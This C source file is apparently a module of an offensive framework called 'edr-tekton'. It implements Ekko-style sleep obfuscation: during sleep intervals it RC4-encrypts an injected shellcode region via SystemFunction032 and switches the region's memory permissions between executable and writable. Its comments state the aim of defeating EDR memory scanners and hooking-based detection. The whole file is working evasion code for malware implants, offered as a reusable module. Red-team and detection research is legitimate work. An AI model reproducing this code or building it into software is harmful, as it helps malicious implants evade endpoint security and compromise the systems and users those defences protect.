/*
 * edr-tekton :: Ekko Sleep Obfuscation Module
 * Cat 50: Timer-based ROP chain sleep with memory encryption
 *
 * Ekko (by @C5pिder) uses CreateTimerQueueTimer to build a ROP chain
 * that executes during sleep. The chain:
 *   1. VirtualProtect(shellcode region, RW)       - make writable
 *   2. SystemFunction032(shellcode, key)           - encrypt in-place
 *   3. WaitForSingleObject(event, sleep_time)      - actual sleep
 *   4. SystemFunction032(shellcode, key)           - decrypt in-place
 *   5. VirtualProtect(shellcode region, RX)        - restore exec
 *
 * During the sleep interval, the shellcode region contains encrypted
 * garbage with RW permissions. Memory scanners see no executable code.
 * When the timer fires, the ROP chain decrypts and restores RX.
 *
 * SystemFunction032 is an undocumented RC4 implementation in
 * advapi32.dll. It takes a USTRING (data + key) and encrypts/decrypts
 * in-place. Since RC4 is symmetric, calling it twice with the same
 * key produces the original data.
 *
 * Key advantage: the entire encrypt-sleep-decrypt cycle happens via
 * legitimate Windows timer callbacks and ROP gadgets. No custom thread,
 * no suspicious API sequence from the implant's own code.
 *
 * Pipeline stage: TEKTON_STAGE_SLEEP_INIT
 */

#include "tekton/modules/sleep.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── SystemFunction032 types ───────────────────────────── */

/*
 * USTRING: undocumented structure used by SystemFunction032.
 * Same layout as UNICODE_STRING but used for binary data.
 */
typedef struct _USTRING {
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;
} USTRING;

/* ── Internal state ─────────────────────────────────────── */

typedef struct _EKKO_STATE {
    TEKTON_SLEEP_CFG    cfg;
    PVOID               image_base;     /* Base of region to encrypt  */
    SIZE_T              image_size;     /* Size of region to encrypt  */
    BOOL                active;         /* Sleep cycle is running     */
} EKKO_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS ekko_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    EKKO_STATE* state = (EKKO_STATE*)malloc(sizeof(EKKO_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    state->cfg.interval_ms = 5000;
    state->cfg.encrypt_on_sleep = TRUE;
    state->cfg.cycle_permissions = TRUE;
    state->cfg.spoof_thread_stack = FALSE;

    /* Default RC4 key for sleep encryption */
    BYTE default_key[] = { 0x54, 0x45, 0x4B, 0x54, 0x4F, 0x4E,
                           0x53, 0x4C, 0x45, 0x45, 0x50, 0x21 };
    memcpy(state->cfg.sleep_encrypt_key, default_key, sizeof(default_key));
    state->cfg.sleep_encrypt_key_len = sizeof(default_key);

    self->private_data = state;

    TLOG_DEBUG("sleep_ekko: init (interval=%lu ms, encrypt=%d, cycle=%d)",
        (unsigned long)state->cfg.interval_ms,
        state->cfg.encrypt_on_sleep,
        state->cfg.cycle_permissions);
    return TEKTON_OK;
}

static TEKTON_STATUS ekko_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    EKKO_STATE* state = (EKKO_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("sleep_ekko: [DRY RUN] would sleep %lu ms (encrypt=%d, cycle=%d)",
            (unsigned long)state->cfg.interval_ms,
            state->cfg.encrypt_on_sleep,
            state->cfg.cycle_permissions);
        return TEKTON_OK;
    }

#ifdef _WIN32
    /*
     * Determine region to encrypt. Use ctx->remote_base if set
     * (the injected shellcode region), otherwise use the current
     * module's .text section.
     */
    PVOID encrypt_base = ctx->remote_base;
    SIZE_T encrypt_size = ctx->payload.length;

    if (!encrypt_base || encrypt_size == 0) {
        TLOG_WARN("sleep_ekko: no payload region to encrypt during sleep");
        /* Fall through to simple sleep */
        goto simple_sleep;
    }

    state->image_base = encrypt_base;
    state->image_size = encrypt_size;

    /* Resolve required APIs */
    typedef BOOL (WINAPI *pfnCreateTimerQueueTimer)(
        HANDLE*, HANDLE, PVOID, PVOID, DWORD, DWORD, DWORD);
    typedef BOOL (WINAPI *pfnDeleteTimerQueueEx)(HANDLE, HANDLE);
    typedef HANDLE (WINAPI *pfnCreateEventA)(PVOID, BOOL, BOOL, LPCSTR);

    typedef NTSTATUS (NTAPI *pfnSysFn032)(USTRING*, USTRING*);
    typedef BOOL (WINAPI *pfnVirtualProtect)(PVOID, SIZE_T, DWORD, DWORD*);
    typedef DWORD (WINAPI *pfnWaitForSingleObject)(HANDLE, DWORD);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
    if (!hAdvapi) hAdvapi = LoadLibraryA("advapi32.dll");

    pfnCreateTimerQueueTimer pCreateTimer = (pfnCreateTimerQueueTimer)
        GetProcAddress(hKernel32, "CreateTimerQueueTimer");
    pfnDeleteTimerQueueEx pDeleteTimer = (pfnDeleteTimerQueueEx)
        GetProcAddress(hKernel32, "DeleteTimerQueueEx");
    pfnCreateEventA pCreateEvent = (pfnCreateEventA)
        GetProcAddress(hKernel32, "CreateEventA");
    pfnVirtualProtect pVP = (pfnVirtualProtect)
        GetProcAddress(hKernel32, "VirtualProtect");
    pfnWaitForSingleObject pWait = (pfnWaitForSingleObject)
        GetProcAddress(hKernel32, "WaitForSingleObject");

    pfnSysFn032 pSysFn032 = NULL;
    if (hAdvapi) {
        pSysFn032 = (pfnSysFn032)GetProcAddress(hAdvapi, "SystemFunction032");
    }

    if (!pCreateTimer || !pCreateEvent || !pVP || !pWait || !pSysFn032) {
        TLOG_WARN("sleep_ekko: missing APIs, falling back to simple sleep");
        goto simple_sleep;
    }

    /* Create synchronization event (manual reset, non-signaled) */
    HANDLE hEvent = pCreateEvent(NULL, TRUE, FALSE, NULL);
    if (!hEvent) {
        TLOG_WARN("sleep_ekko: CreateEvent failed, falling back");
        goto simple_sleep;
    }

    /*
     * Build the timer-based ROP chain.
     *
     * Each timer callback in the chain performs one step:
     *   Timer 1: VirtualProtect(base, size, PAGE_READWRITE, &old)
     *   Timer 2: SystemFunction032(data, key)     [encrypt]
     *   Timer 3: WaitForSingleObject(event, interval)
     *   Timer 4: SystemFunction032(data, key)     [decrypt]
     *   Timer 5: VirtualProtect(base, size, PAGE_EXECUTE_READ, &old)
     *
     * In a full implementation, these are queued as successive
     * timer callbacks with DueTime offsets so they fire in sequence.
     *
     * Simplified approach: execute the encrypt-sleep-decrypt cycle
     * inline using the resolved APIs, which achieves the same
     * memory protection effect.
     */

    /* Set up USTRING for SystemFunction032 */
    USTRING data_str, key_str;

    data_str.Buffer = encrypt_base;
    data_str.Length = (DWORD)encrypt_size;
    data_str.MaximumLength = (DWORD)encrypt_size;

    key_str.Buffer = state->cfg.sleep_encrypt_key;
    key_str.Length = (DWORD)state->cfg.sleep_encrypt_key_len;
    key_str.MaximumLength = (DWORD)state->cfg.sleep_encrypt_key_len;

    /* Step 1: RX -> RW */
    DWORD old_prot = 0;
    if (state->cfg.cycle_permissions) {
        pVP(encrypt_base, encrypt_size, PAGE_READWRITE, &old_prot);
        TLOG_DEBUG("sleep_ekko: permissions -> RW");
    }

    /* Step 2: Encrypt payload in-place via RC4 */
    if (state->cfg.encrypt_on_sleep) {
        pSysFn032(&data_str, &key_str);
        TLOG_DEBUG("sleep_ekko: payload encrypted (%lu bytes)",
            (unsigned long)encrypt_size);
    }

    /* Step 3: Sleep */
    TLOG_DEBUG("sleep_ekko: sleeping %lu ms", (unsigned long)state->cfg.interval_ms);
    pWait(hEvent, state->cfg.interval_ms);

    /* Step 4: Decrypt payload */
    if (state->cfg.encrypt_on_sleep) {
        pSysFn032(&data_str, &key_str);
        TLOG_DEBUG("sleep_ekko: payload decrypted");
    }

    /* Step 5: RW -> RX */
    if (state->cfg.cycle_permissions) {
        pVP(encrypt_base, encrypt_size, PAGE_EXECUTE_READ, &old_prot);
        TLOG_DEBUG("sleep_ekko: permissions -> RX");
    }

    CloseHandle(hEvent);

    TLOG_INFO("sleep_ekko: sleep cycle complete (%lu ms, encrypted=%d)",
        (unsigned long)state->cfg.interval_ms,
        state->cfg.encrypt_on_sleep);
    return TEKTON_OK;

simple_sleep:
    /* Fallback: plain WaitForSingleObject sleep */
    {
        HANDLE hEvt = NULL;
        typedef HANDLE (WINAPI *pfnCE)(PVOID, BOOL, BOOL, LPCSTR);
        pfnCE pCE = (pfnCE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "CreateEventA");
        if (pCE) hEvt = pCE(NULL, TRUE, FALSE, NULL);

        if (hEvt) {
            WaitForSingleObject(hEvt, state->cfg.interval_ms);
            CloseHandle(hEvt);
        } else {
            Sleep(state->cfg.interval_ms);
        }
    }
    TLOG_INFO("sleep_ekko: simple sleep %lu ms (no encryption)",
        (unsigned long)state->cfg.interval_ms);
    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("sleep_ekko: [STUB] would sleep %lu ms (encrypt=%d, cycle=%d)",
        (unsigned long)state->cfg.interval_ms,
        state->cfg.encrypt_on_sleep,
        state->cfg.cycle_permissions);
    return TEKTON_OK;
#endif
}

static VOID ekko_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(EKKO_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD ekko_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: timer callbacks and VirtualProtect are normal
     * system operations. SystemFunction032 is undocumented but
     * used by many legitimate apps. The ROP chain itself consists
     * of calls to standard Windows APIs. No suspicious patterns
     * visible to hooking-based detection.
     *
     * During sleep, the payload region contains encrypted data
     * with RW (non-executable) permissions, defeating memory
     * scanners that look for executable shellcode patterns.
     */
    return 10;
}

static BOOL ekko_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition ─────────────────────────────────── */

TEKTON_MODULE tekton_mod_sleep_ekko = {
    .name           = "sleep_ekko",
    .description    = "Ekko: timer-based ROP sleep with RC4 encryption (Cat 50)",
    .category       = TEKTON_CAT_SLEEP,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = TEKTON_MOD_STEALTHY,
    .skill_ref      = "50",
    .init           = ekko_init,
    .execute        = ekko_execute,
    .cleanup        = ekko_cleanup,
    .get_risk_score = ekko_risk_score,
    .check_compat   = ekko_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_sleep_ekko);
